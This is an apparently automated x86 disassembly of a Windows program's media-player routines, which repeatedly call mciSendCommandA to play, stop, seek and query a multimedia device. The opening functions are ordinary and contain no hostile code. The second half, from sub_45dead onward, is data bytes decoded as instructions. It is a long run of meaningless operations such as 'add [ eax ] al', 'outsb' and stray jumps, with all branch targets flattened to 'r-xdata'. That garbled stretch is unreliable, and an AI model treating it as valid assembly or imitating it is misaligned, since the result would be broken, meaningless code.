call sub_45d018
sub_45cf84
push ebx
push ecx
mov ebx eax
mov eax ebx
call sub_45c874
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x809
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
pop edx
pop ebx
retn
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_45d018
push ebx
push esi
push ecx
mov ebx eax
mov eax ebx
call sub_45c874
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x855
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov esi eax
mov [ ebx + 0x304 ] esi
test esi esi
je r-xdata
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x1
jmp r-xdata
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax ebx
call sub_45ccbc
jmp r-xdata
or [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2ef ] 0x0
pop edx
pop esi
pop ebx
retn
mov [ ebx + 0x2ee ] 0x0
sub_45d0cc
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45c874
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov esi [ ebx + 0x2e8 ]
mov eax ebx
call sub_45db3c
cmp al 0xa
jne r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
or esi 0x200
mov [ ebx + 0x2e8 ] esi
mov eax ebx
call sub_45dab8
cmp al 0x2
jne r-xdata
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax ebx
call sub_45dafc
call sub_45b128
mov edi eax
and edi 0xff
mov eax ebx
call sub_45da70
cmp edi eax
jne r-xdata
mov eax ebx
call sub_45dafc
call sub_45b128
mov esi eax
and esi 0xff
mov eax ebx
call sub_45da70
cmp esi eax
jne r-xdata
mov eax ebx
call sub_45dafc
call sub_45b128
xor edx edx
mov dl al
inc edx
mov eax ebx
call sub_45d690
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_45da70
mov edx eax
mov eax ebx
call sub_45d690
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_45dafc
call sub_45b128
xor edx edx
mov dl al
inc edx
mov eax ebx
call sub_45d690
mov edx eax
mov eax ebx
call sub_45d6c8
mov eax ebx
call sub_45da70
mov edx eax
mov eax ebx
call sub_45d690
mov edx eax
mov eax ebx
call sub_45d6c8
jmp r-xdata
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x807
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
or esi 0x8
mov [ ebx + 0x2e8 ] esi
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_45ccbc
mov [ ebx + 0x2aa ] 0x0
jmp r-xdata
sub_45d25c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45c874
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov ebp [ ebx + 0x2e8 ]
mov eax ebx
call sub_45db3c
cmp al 0xa
jne r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
or ebp 0x100
mov [ ebx + 0x2e8 ] ebp
mov eax ebx
call sub_45dafc
mov esi eax
mov eax ebx
call sub_45dafc
call sub_45b128
xor edx edx
mov dl al
mov eax ebx
call sub_45d690
mov edi eax
mov eax ebx
call sub_45dab8
cmp al 0x2
jne r-xdata
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax esi
call sub_45b128
cmp al 0x1
je r-xdata
mov eax esi
call sub_45b128
cmp al 0x1
je r-xdata
mov [ esp + 0x4 ] edi
mov eax esi
call sub_45b12c
push eax
mov eax edi
call sub_45b12c
pop edx
cmp dl al
jne r-xdata
mov edx edi
mov eax ebx
call sub_45d6c8
mov eax esi
call sub_45b12c
push eax
mov eax edi
call sub_45b12c
pop edx
cmp dl al
jne r-xdata
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x807
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax esi
call sub_45b134
push eax
mov eax edi
call sub_45b134
pop edx
cmp dl al
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45b134
push eax
mov eax edi
call sub_45b134
pop edx
cmp dl al
jne r-xdata
mov eax ebx
call sub_45dafc
call sub_45b128
xor edx edx
mov dl al
dec edx
mov eax ebx
call sub_45d690
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_45dafc
call sub_45b128
xor edx edx
mov dl al
dec edx
mov eax ebx
call sub_45d690
mov edx eax
mov eax ebx
call sub_45d6c8
jmp r-xdata
or ebp 0x8
mov [ ebx + 0x2e8 ] ebp
jmp r-xdata
mov eax ebx
call sub_45ccbc
mov [ ebx + 0x2aa ] 0x0
jmp r-xdata
sub_45d418
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45c874
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x31e ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_45dafc
mov esi eax
mov eax ebx
call sub_45da28
cmp esi eax
jne r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_45d664
or [ ebx + 0x2e8 ] 0x20000
mov eax [ ebx + 0x300 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80e
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_45d4f4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45c874
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebx
retn
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax [ ebx + 0x2e8 ]
or eax 0x20000
or eax 0x10000
mov [ ebx + 0x2e8 ] eax
mov eax [ ebx + 0x300 ]
mov [ esp + 0x4 ] eax
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80e
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_45d5b8
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_45c874
cmp [ ebx + 0x2e5 ] 0x0
je r-xdata
add esp 0xc
pop ebx
retn
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x100
mov eax ebx
call sub_43f228
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80d
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_45d664
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_45c874
mov eax 0x102
mov edx esp
push edx
push eax
push 0x807
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
pop ecx
pop edx
pop ebx
retn
sub_45d690
add esp 0xfffffff0
mov ecx 0x112
mov [ eax + 0x2e8 ] ecx
mov [ esp + 0x8 ] 0x2
mov [ esp + 0xc ] edx
mov edx esp
push edx
push ecx
push 0x814
movzx eax [ eax + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esp + 0x4 ]
add esp 0x10
retn
sub_45d6f0
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov esi 0x401
mov [ ebx + 0x2e8 ] esi
xor eax eax
mov al dl
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push esi
push 0x80d
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
add esp 0xc
pop esi
pop ebx
retn
sub_45d72c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x30c ] esi
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x10002
mov eax esi
call sub_43f228
mov [ esp + 0x4 ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x841
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov edi eax
mov [ ebx + 0x304 ] edi
test edi edi
je r-xdata
mov [ ebx + 0x30c ] esi
mov edx ebx
mov eax esi
call sub_41921c
jmp r-xdata
xor eax eax
mov [ ebx + 0x30c ] eax
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_45d7b4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_437f10
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30c ]
jne r-xdata
cmp [ edi + 0x2e1 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x30c ] eax
mov eax edi
call sub_45d7f4
sub_45d7f4
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
mov esi 0x10002
mov [ ebx + 0x2e8 ] esi
xor eax eax
mov [ esp + 0x4 ] eax
mov eax esp
push eax
push esi
push 0x841
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
sub_45d840
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov ebx eax
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
mov esi 0x40000
mov [ ebx + 0x2e8 ] esi
mov eax esp
push eax
push esi
push 0x843
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_45d894
push ebx
push esi
push edi
add esp 0xffffffd0
mov ebx eax
mov esi esp
mov eax 0x102
mov [ ebx + 0x2e8 ] eax
mov [ esi + 0x8 ] 0x8
push esi
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e3 ] al
test al al
je r-xdata
mov [ esi + 0x8 ] 0x1
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e6 ] al
test al al
je r-xdata
or [ ebx + 0x2e2 ] 0x4
mov [ esi + 0x8 ] 0x7
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e5 ] al
test al al
je r-xdata
or [ ebx + 0x2e2 ] 0x8
mov [ esi + 0x8 ] 0x3
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
mov [ ebx + 0x2e7 ] al
test al al
je r-xdata
or [ ebx + 0x2e2 ] 0x2
mov [ esi + 0x8 ] 0x4
push esi
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80b
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov eax [ esi + 0x4 ]
cmp eax 0x207
je r-xdata
or [ ebx + 0x2e2 ] 0x10
mov [ ebx + 0x2e4 ] 0x1
cmp eax 0x208
je r-xdata
mov esi 0x20000
mov [ ebx + 0x2e8 ] esi
lea eax [ esp + 0xc ]
push eax
push esi
push 0x843
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
lea esi [ esp + 0x10 ]
lea edi [ esp + 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ esp + 0x28 ]
sub eax [ esp + 0x20 ]
mov [ ebx + 0x310 ] eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x24 ]
mov [ ebx + 0x314 ] eax
add esp 0x30
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x2e2 ] 0x1
cmp eax 0x203
je r-xdata
cmp eax 0x201
jne r-xdata
cmp [ ebx + 0x2e4 ] 0x0
je r-xdata
sub_45da28
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_45c874
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x1
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_45da70
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_45c874
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x3
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_45dab8
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x4
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov al [ esp + 0x4 ]
sub al 0xc
add esp 0x10
pop esi
pop ebx
retn
sub_45dafc
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x2
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov eax [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_45db3c
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_45c874
mov esi 0x102
mov [ ebx + 0x2e8 ] esi
mov [ esp + 0x8 ] 0x6
mov eax esp
push eax
push esi
push 0x814
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
mov al [ esp + 0x4 ]
add esp 0x10
pop esi
pop ebx
retn
sub_45db84
push ebx
push esi
add esp 0xfffff004
push eax
mov esi edx
mov ebx eax
push 0x1000
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x304 ]
push eax
call mciGetErrorStringA
test eax eax
jne r-xdata
mov eax esp
call sub_40833c
mov ecx eax
mov edx esp
mov eax esi
call sub_404080
mov edx esi
mov eax [ rw-data ]
call sub_405a90
jmp r-xdata
add esp 0x1000
pop esi
pop ebx
retn
sub_45dbd4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45dbf9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dc00
retn
sub_45dc9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45dcc1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45dcc8
retn
sub_45dead
clc
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f430b00
outsb
outsb
arpl [ gs : ebp + ecx * 2 + 0x6f ] si
add [ gs : eax ] dl
inc eax
add bh al
add [ eax ] al
[ ecx + edi * 8 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ ebx ] cl
inc esi
outsd
jb r-xdata
inc ebp
add [ eax ] cl
add [ eax ] al
js r-xdata
popad
je r-xdata
inc ebp
add [ esi + edi ] dh
inc ecx
add ah al
xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ ebp + edx * 4 - 0x487ffbf ] bl
inc ebp
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
dec edi
jo r-xdata
push 0xc0737261
push cs
inc ecx
add [ eax - 0x4f010000 ] dh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070007 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
dec edi
outsb
inc ebx
push 0x65676e61
lea eax [ eax ]
sbb [ eax ] bl
inc ecx
add [ eax ] dh
add [ eax ] al
[ esp + edi * 8 ]
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add [ eax ] ah
cli
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] dl
add [ eax ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
lea eax [ eax ]
fcomp st7
inc ebp
add [ edi ] al
push cs
push esp
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x65744974
insd
sbb bh 0x45
add [ ecx + 0x41 ] dh
add [ edi ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add eax 0x40109400
add ah bh
sti
inc ebp
add [ eax ] ch
cld
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040002 ] al
js r-xdata
add [ esi + edx * 4 - 0x6717ffbf ] ah
outsb
nop
sbb bh 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x27ffba21 ] dh
fild [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x45df
inc eax
add [ edx + edi * 8 + 0x45 ] ah
add [ edx + esi ] cl
ror [ esi ] 0x41
add [ eax - 0x47010000 ] bh
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060008 ] al
outsb
sub_45e2fb
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0800
inc ebx
push 0x65676e61
ror [ esi ] 0x41
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0006 ] al
outsb
push eax
outsd
imul esp [ ebp + 0x44 ] 0x61
je r-xdata
lodsb [ esi ]
xchg ebp eax
inc ecx
add [ esi + edx * 4 - 0x6717ffbf ] ah
nop
mov bl ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x27ffba1d ] bh
jecxz r-xdata
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ebp
rcr al 0xe3
inc ecx
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
pushfd
xchg ebp eax
inc ecx
add [ eax - 0x6c ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl cl
jecxz r-xdata
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x340045ea ] al
inc ecx
add ah al
xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ ebp + edx * 4 - 0x6b97ffbf ] bl
jecxz r-xdata
inc ecx
add [ eax + 0xe0045e9 ] ah
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
call 0xffffffffbc462541
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
add [ eax + eax ] cl
add [ eax + 0x20 ] bh
inc ecx
add al dl
cwde
xor al 0x40
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] cl
inc ebp
inc esp
inc ebp
jb r-xdata
add [ ecx + 0x41 ] dh
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
inc eax
in al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1c ] al
inc ebp
add [ eax + eax ] cl
add [ eax ] al
or al 0x6e
inc eax
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
outsd
jb r-xdata
adc [ esi + eax * 2 ] al
jb r-xdata
inc ebp
add [ edi ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
rcr [ eax + 0x45e4 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x45e4 0x0
in al dx
in al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bl
in al 0x45
add [ eax ] al
add [ eax ] al
js r-xdata
je r-xdata
jb r-xdata
add [ esi + edi ] dh
add [ eax ] al
add [ esi + 0x480045e5 ] bl
add [ eax ] al
add [ eax + 0x20 ] bh
inc ecx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
je r-xdata
inc ecx
add [ eax + 0x9 ] bl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x340040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
inc esi
add [ esi + edi ] dh
inc ecx
add ah al
xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ ebp + edx * 4 - 0x6b97ffbf ] bl
inc ecx
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x34004609 ] dl
inc ecx
inc eax
add [ esi + edi ] dh
inc ecx
add [ esi + edi ] bh
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ esi ] cl
add [ eax ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
out 0x45 al
add [ eax + eax ] dl
add [ eax ] al
push esp
adc eax 0x34880041
inc eax
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
outsd
outsb
jbe r-xdata
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] dl
add al 0x46
add [ eax - 0xfffbfcc ] dl
insd
nop
in al dx
in al 0x45
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
call sub_408a04
jmp r-xdata
insd
nop
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
rcr [ eax + 0x34940041 ] 0x1
inc eax
mov al 0xe5
inc ebp
add [ edi ] al
or al 0x54
inc esp
push ebx
jb r-xdata
inc ecx
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add ah cl
add eax [ esi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
or al 0x54
inc esp
push ebx
jb r-xdata
add [ eax - 0x6c ] ch
jb r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e789
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fb4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xc08b6d65
push eax
out 0x45 al
add [ edi ] al
or edx [ esp + eax * 2 + 0x64 ]
inc ebx
insb
imul ecx [ ecx + 0x74 ] 0xe6206d65
inc ebp
add al cl
adc eax 0x10041
push es
inc esp
dec ebp
popad
outsb
add [ eax ] eax
xchg esp eax
adc [ eax ] al
add al 0x0
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
add al 0x49
je r-xdata
jb r-xdata
add [ eax ] dl
xchg edx eax
xchg esp eax
xor al 0x40
je r-xdata
xor [ eax ] eax
or al 0x32
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
outsd
outsb
jbe r-xdata
inc ecx
add ah al
